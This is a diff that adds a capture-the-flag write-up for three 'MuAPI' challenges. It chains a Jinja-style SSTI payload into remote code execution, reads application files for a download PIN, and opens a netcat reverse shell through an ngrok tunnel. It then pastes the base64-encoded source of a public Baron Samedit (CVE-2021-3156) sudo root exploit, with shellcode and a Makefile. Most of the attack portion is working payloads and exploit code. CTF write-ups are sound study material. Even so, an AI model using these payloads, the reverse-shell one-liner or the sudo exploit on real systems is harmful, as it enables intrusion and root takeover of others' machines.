@@ -74,6 +74,206 @@ After Burp Suite Intruder finishes, we see that the flag is inside the response 
 
 Flag: apisec{Th4t5_JuSt_IDORabl3}
 
+# MuAPI
+
+## Data Driven Discovery
+
+### Points: 250
+
+*I did not receive points for this challenge as it was solved after the competition concluded.*
+
+Turns out that the pentest report was never actually read by the mages. Typical. But it's not like anyone can actually get into our system, right? The report was pretty vague. Target URL: [https://muapi.chals.ctf.malteksolutions.com/](https://muapi.chals.ctf.malteksolutions.com/)
+
+Looking at the application, there is not much functionality.
+
+![](images/data-driven-discovery-1.png)
+
+There is a "Log In" and "Sign Up" page, each do not seem to be fruitful in anyway.
+
+After bruteforcing directories, we stumble upon a `/api/v1/news` directory. It says that we are missing an API key.
+
+![](images/data-driven-discovery-2.png)
+
+Appending a `/help` onto the endpoint, we see that it reflects in the error message.
+
+```
+https://muapi.chals.ctf.malteksolutions.com/api/v1/news/help
+```
+
+![](images/data-driven-discovery-3.png)
+
+Try various different injection types, we can see that Server-Side Template Injection (SSTI) worked!
+
+```
+https://muapi.chals.ctf.malteksolutions.com/api/v1/news/{{7*7}}
+```
+
+![](images/data-driven-discovery-4.png)
+
+Using a basic SSTI payload, we receive Remote Code Execution (RCE).
+
+```
+https://muapi.chals.ctf.malteksolutions.com/api/v1/news/%7B%7B%20self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()%20%7D%7D
+```
+
+![](images/data-driven-discovery-5.png)
+
+After some navigation on the server, we see there is a `flag.txt`.
+
+```
+https://muapi.chals.ctf.malteksolutions.com/api/v1/news/%7B%7B%20self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la ..').read()%20%7D%7D
+```
+
+![](images/data-driven-discovery-6.png)
+
+We can retrieve the flag.
+
+```
+https://muapi.chals.ctf.malteksolutions.com/api/v1/news/%7B%7B%20self.__init__.__globals__.__builtins__.__import__('os').popen('cat ../flag.txt').read()%20%7D%7D
+```
+
+![](images/data-driven-discovery-7.png)
+
+Flag: apisec{Y0U-G0T-RC3-223}
+
+## Breaking Into Admin Territory
+
+### Points: 150
+
+*I did not receive points for this challenge as it was solved after the competition concluded.*
+
+Check out the new music streaming service that the mages have been working on! IT said they had a pentest done, but we actually have no idea what the results were. It's probably fine though, right? Target URL: [https://muapi.chals.ctf.malteksolutions.com/](https://muapi.chals.ctf.malteksolutions.com/)
+
+With the RCE from the previous challenge, we can start to look through some of the application files. Within the `app/api.py` directory, we see there is a `report.pdf` endpoint that requires a PIN from `current_app.config['DOWNLOAD_KEY']`.
+
+```
+https://muapi.chals.ctf.malteksolutions.com/api/v1/news/%7B%7B%20self.__init__.__globals__.__builtins__.__import__('os').popen('cat app/api.py').read()%20%7D%7D
+```
+
+![](images/breaking-into-admin-territory-1.png)
+
+```python
+@api_blueprint.route("/files/2882b66aafcf5233c61002810387fa97/report.pdf")
+def download():
+    filename = "report.pdf"
+    pin = request.args.get("pin", None)
+    if str(pin) == str(current_app.config["DOWNLOAD_KEY"]):
+        return send_file(f"{os.getcwd()}/app/downloads/{filename}", as_attachment=True)
+    elif pin:
+        return "Invalid pin entered by application, enter your 4 digit pin"
+    else:
+        return "No pin entered by application, enter your 4 digit pin"
+```
+
+Doing a recursive grep search for the word `DOWNLOAD_KEY` reveals the PIN number.
+
+```
+https://muapi.chals.ctf.malteksolutions.com/api/v1/news/%7B%7B%20self.__init__.__globals__.__builtins__.__import__('os').popen('grep -r "DOWNLOAD_KEY"').read()%20%7D%7D
+```
+
+![](images/breaking-into-admin-territory-2.png)
+
+We can perform a GET request and download the `report.pdf` file.
+
+```
+https://muapi.chals.ctf.malteksolutions.com/api/v1/files/2882b66aafcf5233c61002810387fa97/report.pdf?pin=2190
+```
+
+Within the report, we see that the flag is at the bottom.
+
+![](images/breaking-into-admin-territory-3.png)
+
+Flag: apisec{SQL-M45T3R-4-L1F3-381}
+
+## Above and Beyond
+
+### Points: 250
+
+*I did not receive points for this challenge as it was solved after the competition concluded.*
+
+We just got word that there's a privilege escalation vulnerability on the system running MuAPI! This was _just_ disclosed to us now. Perhaps someone can figure out what's going on?  
+Target URL: [https://muapi.chals.ctf.malteksolutions.com/](https://muapi.chals.ctf.malteksolutions.com/)
+
+ With the RCE, we can obtain a reverse shell and figure out how to privilege escalate.
+
+This next part is with the help of [SloppyJoePirates CTF Writeups](https://www.youtube.com/@SloppyJoePirates). He showed me a way use `ngrok` to port forward and obtain a shell. This method requires an account on the [ngrok](ngrok.com/) website.
+
+After you setup `ngrok` on Kali, we can start ngrok on port 4444.
+
+```
+ngrok tcp 4444
+```
+
+Within the ngrok window, you will see a section called `Forwarding`. An example is below.
+
+```
+Forwarding                    tcp://0.tcp.ngrok.io:12860 -> localhost:4444 
+```
+
+In a different terminal, setup a netcat listener on port 4444.
+
+```
+nc -lvnp 4444
+```
+
+We can obtain a reverse shell using the following URL:
+
+```
+https://muapi.chals.ctf.malteksolutions.com/api/v1/news/%7B%7B%20self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ngrok URL> <ngrok port> >/tmp/f').read()%20%7D%7D
+```
+
+After sending the request, we get a connection back.
+
+![](images/above-and-beyond-1.png)
+
+
+After stablizing a shell,. we see that the sudo version is `1.8.31`.
+
+```
+sudo -V
+```
+
+![](images/above-and-beyond-2.png)
+
+We  also see that system is running Ubuntu 20.04 LTS (Focal Fossa).
+
+```
+cat /etc/os-release
+```
+
+![](images/above-and-beyond-3.png)
+
+Looking up the sudo version, we see there is a vulnerability called Baron Samedit. Using [this github](https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit/tree/main), we can transfer the files to the server.
+
+However, we cannot use the typical `wget` or `curl` because those are not installed on the system.
+
+![](images/above-and-beyond-4.png)
+
+Another way to transfer files is by base64 encoding each one.
+
+```
+# shellcode.c
+
+echo "c3RhdGljIHZvaWQgX19hdHRyaWJ1dGVfXygoY29uc3RydWN0b3IpKSBfaW5pdCh2b2lkKSB7CiAgX19hc20gX192b2xhdGlsZV9fKAogICAgICAiYWRkcSAkNjQsICVyc3A7IgogICAgICAvLyBzZXR1aWQoMCk7CiAgICAgICJtb3ZxICQxMDUsICVyYXg7IgogICAgICAibW92cSAkMCwgJXJkaTsiCiAgICAgICJzeXNjYWxsOyIKICAgICAgLy8gc2V0Z2lkKDApOwogICAgICAibW92cSAkMTA2LCAlcmF4OyIKICAgICAgIm1vdnEgJDAsICVyZGk7IgogICAgICAic3lzY2FsbDsiCiAgICAgIC8vIGV4ZWN2ZSgiL2Jpbi9zaCIpOwogICAgICAibW92cSAkNTksICVyYXg7IgogICAgICAibW92cSAkMHgwMDY4NzMyZjZlNjk2MjJmLCAlcmRpOyIKICAgICAgInB1c2hxICVyZGk7IgogICAgICAibW92cSAlcnNwLCAlcmRpOyIKICAgICAgIm1vdnEgJDAsICVyZHg7IgogICAgICAicHVzaHEgJXJkeDsiCiAgICAgICJwdXNocSAlcmRpOyIKICAgICAgIm1vdnEgJXJzcCwgJXJzaTsiCiAgICAgICJzeXNjYWxsOyIKICAgICAgLy8gZXhpdCgwKTsKICAgICAgIm1vdnEgJDYwLCAlcmF4OyIKICAgICAgIm1vdnEgJDAsICVyZGk7IgogICAgICAic3lzY2FsbDsiKTsKfQo=" | base64 -d > shellcode.c
+
+# exploit.c
+
+echo "I2luY2x1ZGUgPHVuaXN0ZC5oPiAvLyBleGVjdmUoKQojaW5jbHVkZSA8c3RyaW5nLmg+IC8vIHN0cmNhdCgpCgovKiBFeHBsb2l0IGZvciBDVkUtMjAyMS0zMTU2LCBkcm9wcyBhIHJvb3Qgc2hlbGwuCiAqIEFsbCBjcmVkaXQgZm9yIG9yaWdpbmFsIHJlc2VhcmNoOiBRdWFseXMgUmVzZWFyY2ggVGVhbS4KICogaHR0cHM6Ly9ibG9nLnF1YWx5cy5jb20vdnVsbmVyYWJpbGl0aWVzLXJlc2VhcmNoLzIwMjEvMDEvMjYvY3ZlLTIwMjEtMzE1Ni1oZWFwLWJhc2VkLWJ1ZmZlci1vdmVyZmxvdy1pbi1zdWRvLWJhcm9uLXNhbWVkaXQKICoKICogVGVzdGVkIG9uIFVidW50dSAyMC4wNCBhZ2FpbnN0IHN1ZG8gMS44LjMxCiAqIEF1dGhvcjogTWF4IEthbXBlcgogKi8KCnZvaWQgbWFpbih2b2lkKSB7CgogICAgLy8gJ2J1Zicgc2l6ZSBkZXRlcm1pbmVzIHNpemUgb2Ygb3ZlcmZsb3dpbmcgY2h1bmsuCiAgICAvLyBUaGlzIHdpbGwgYWxsb2NhdGUgYW4gMHhmMC1zaXplZCBjaHVuayBiZWZvcmUgdGhlIHRhcmdldCBzZXJ2aWNlX3VzZXIgc3RydWN0LgogICAgaW50IGk7CiAgICBjaGFyIGJ1ZlsweGYwXSA9IHswfTsKICAgIG1lbXNldChidWYsICdZJywgMHhlMCk7CiAgICBzdHJjYXQoYnVmLCAiXFwiKTsKCiAgICBjaGFyKiBhcmd2W10gPSB7CiAgICAgICAgInN1ZG9lZGl0IiwKICAgICAgICAiLXMiLAogICAgICAgIGJ1ZiwKICAgICAgICBOVUxMfTsKCiAgICAvLyBVc2Ugc29tZSBMQ18gdmFycyBmb3IgaGVhcCBGZW5nLVNodWkuCiAgICAvLyBUaGlzIHNob3VsZCBhbGxvY2F0ZSB0aGUgdGFyZ2V0IHNlcnZpY2VfdXNlciBzdHJ1Y3QgaW4gdGhlIHBhdGggb2YgdGhlIG92ZXJmbG93LgogICAgY2hhciBtZXNzYWdlc1sweGUwXSA9IHsiTENfTUVTU0FHRVM9ZW5fR0IuVVRGLThAIn07CiAgICBtZW1zZXQobWVzc2FnZXMgKyBzdHJsZW4obWVzc2FnZXMpLCAnQScsIDB4YjgpOwoKICAgIGNoYXIgdGVsZXBob25lWzB4NTBdID0geyJMQ19URUxFUEhPTkU9Qy5VVEYtOEAifTsKICAgIG1lbXNldCh0ZWxlcGhvbmUgKyBzdHJsZW4odGVsZXBob25lKSwgJ0EnLCAweDI4KTsKCiAgICBjaGFyIG1lYXN1cmVtZW50WzB4NTBdID0geyJMQ19NRUFTVVJFTUVOVD1DLlVURi04QCJ9OwogICAgbWVtc2V0KG1lYXN1cmVtZW50ICsgc3RybGVuKG1lYXN1cmVtZW50KSwgJ0EnLCAweDI4KTsKCiAgICAvLyBUaGlzIGVudmlyb25tZW50IHZhcmlhYmxlIHdpbGwgYmUgY29waWVkIG9udG8gdGhlIGhlYXAgYWZ0ZXIgdGhlIG92ZXJmbG93aW5nIGNodW5rLgogICAgLy8gVXNlIGl0IHRvIGJyaWRnZSB0aGUgZ2FwIGJldHdlZW4gdGhlIG92ZXJmbG93IGFuZCB0aGUgdGFyZ2V0IHNlcnZpY2VfdXNlciBzdHJ1Y3QuCiAgICBjaGFyIG92ZXJmbG93WzB4NTAwXSA9IHswfTsKICAgIG1lbXNldChvdmVyZmxvdywgJ1gnLCAweDRjZik7CiAgICBzdHJjYXQob3ZlcmZsb3csICJcXCIpOwoKICAgIC8vIE92ZXJ3cml0ZSB0aGUgJ2ZpbGVzJyBzZXJ2aWNlX3VzZXIgc3RydWN0J3MgbmFtZSB3aXRoIHRoZSBwYXRoIG9mIG91ciBzaGVsbGNvZGUgbGlicmFyeS4KICAgIC8vIFRoZSBiYWNrc2xhc2hlcyB3cml0ZSBudWxscyB3aGljaCBhcmUgbmVlZGVkIHRvIGRvZGdlIGEgY291cGxlIG9mIGNyYXNoZXMuCiAgICBjaGFyKiBlbnZwW10gPSB7CiAgICAgICAgb3ZlcmZsb3csCiAgICAgICAgIlxcIiwgIlxcIiwgIlxcIiwgIlxcIiwgIlxcIiwgIlxcIiwgIlxcIiwgIlxcIiwKICAgICAgICAiWFhYWFhYWFxcIiwKICAgICAgICAiXFwiLCAiXFwiLCAiXFwiLCAiXFwiLCAiXFwiLCAiXFwiLCAiXFwiLCAiXFwiLAogICAgICAgICJcXCIsICJcXCIsICJcXCIsICJcXCIsICJcXCIsICJcXCIsICJcXCIsCiAgICAgICAgIngveFxcIiwKICAgICAgICAiWiIsCiAgICAgICAgbWVzc2FnZXMsCiAgICAgICAgdGVsZXBob25lLAogICAgICAgIG1lYXN1cmVtZW50LAogICAgICAgIE5VTEx9OwoKICAgIC8vIEludm9rZSBzdWRvZWRpdCB3aXRoIG91ciBhcmd2ICYgZW52cC4KICAgIGV4ZWN2ZSgiL3Vzci9iaW4vc3Vkb2VkaXQiLCBhcmd2LCBlbnZwKTsKfQo=" | base64 -d > exploit.c
+
+# Makefile
+
+echo "YWxsOiBzaGVsbGNvZGUgZXhwbG9pdAoKc2hlbGxjb2RlOiBzaGVsbGNvZGUuYwoJbWtkaXIgbGlibnNzX3gKCSQoQ0MpIC1PMyAtc2hhcmVkIC1ub3N0ZGxpYiAtbyBsaWJuc3NfeC94LnNvLjIgc2hlbGxjb2RlLmMKCmV4cGxvaXQ6IGV4cGxvaXQuYwoJJChDQykgLU8zIC1vIGV4cGxvaXQgZXhwbG9pdC5jCgpjbGVhbjoKCXJtIC1yZiBsaWJuc3NfeCBleHBsb2l0Cg==" | base64 -d > Makefile
+```
+
+Now that we have all the files we need, we can run the `make` command, which will make an exploit binary.
+
+![](images/above-and-beyond-5.png)
+
+Lastly, we can run the `exploit` binary, and obtain a shell as root. The flag is in the `/root/flag.txt` file.
+
+![](images/above-and-beyond-6.png)
+
+Flag: apisec{N0W-Y0U-G0T-R00T-995}
 # Insecure Runes 
 
 ## Insecure Runes
